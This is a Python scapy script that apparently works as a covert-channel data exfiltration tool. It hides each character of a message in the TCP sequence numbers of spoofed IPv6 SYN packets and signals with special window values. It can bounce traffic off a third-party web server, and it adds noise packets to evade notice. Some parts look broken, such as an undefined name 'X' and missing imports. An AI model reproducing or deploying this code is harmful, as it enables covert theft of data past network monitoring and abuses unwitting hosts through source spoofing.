
from scapy.all import *
multiplier = 16777216  # the server will be performing the division


def add_n0ise_iseq(pkt, exfilArrayCharValue):
    print('[*] adding n0ise to iseq..')
    pkt.window = int(8182) - random.randint(23, 275)
    try:
        print("noise_iseq")
        pkt.seq = 10000
        send(pkt)
    except socket.error:
        print("\nERROR: Problem sending packets, are you root?\n")
        exit(0)


def convert_iseq(message):
    retval = []
    print('[*] converting iseq message: %s' % message)
    for char in message:
        c = ord(char)
        # While we are here, might as well generate our SYN packet sequence
        # number.
        exfilChar = c * multiplier
        # Add seq to the global exfilArray.
        if is_32bit(exfilChar):
            print('[+] iseq size OK')
        else:
            print('[-] Warning: iseq int too large %d. Setting to X' % exfilChar)
            exfilChar = ord(X) * multiplier
        retval.append(exfilChar)
        print('%s=%d, exfilChar=%d' % (char, c, exfilChar))
        print("retval",retval)
    return retval

def exfil_iseq(spoof, destination, dstport, message,data, bounce):
    i = 0
    length = len(data)
    exfilMsg = convert_iseq(message)
    # if bounce == 1 then dst=spoof, src=destination, dport=80, sport=dstport
    # window = 1339 will indicate that this is a bounced packet
    # Let bounce off a google www server.
    if bounce == 1:
        pkt = IPv6(src=destination, dst='fdb4:23a7:8207::1') / TCP(sport=dstport, dport=80, flags='S')
    else:
        pkt = IPv6(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')

    fflag = 0
    for c in exfilMsg:
        add_n0ise_iseq(pkt, exfilMsg[i])
        if bounce == 1:
            # NOTE: we can't control the window size sent by the bounce host.
            #       we need another indicator.
            pkt.window = 1339
        else:
            pkt.window = 1337
        pkt.seq = exfilMsg[i]

        print("pkt.seq:",pkt.seq)
        # slow our roll
        time.sleep(0.4)
        try:
            print('[window] ' + str(pkt.window))
            print('[bounce] ' + str(bounce))
            send(pkt/data[fflag])
            if fflag != length - 1:
                fflag += 1
        except socket.error:
            print("\nERROR: Problem sending packets, are you root?\n")
            exit(0)
        i += 1
    send_eom(pkt)


def is_32bit(input_to_check):
    """ Validate that we have a 32-bit value so it will fit into the
    TCP sequence number header

    Args:
        input_to_check (int): Integer value to check

    Returns:
        True if the value is 32-bit, False otherwise
    """
    bitl = (input_to_check).bit_length()
    if bitl <= 32:
        # print '[*] OK: int is 32bit'
        return True
    else:
        # print '[-] Warning: int is too large.'
        return False


def send_eom(pkt):
    """
    Send the last message, encoded with a special Window to let the server know
    we're done. Set the window=7331 to indicate end-of-message

    Args:
        pkt (Packet): Scapy packet
    """

    print('[*] Sending End-Of-Message')
    pkt.window = 7331  # It's a magical number!
    send(pkt)
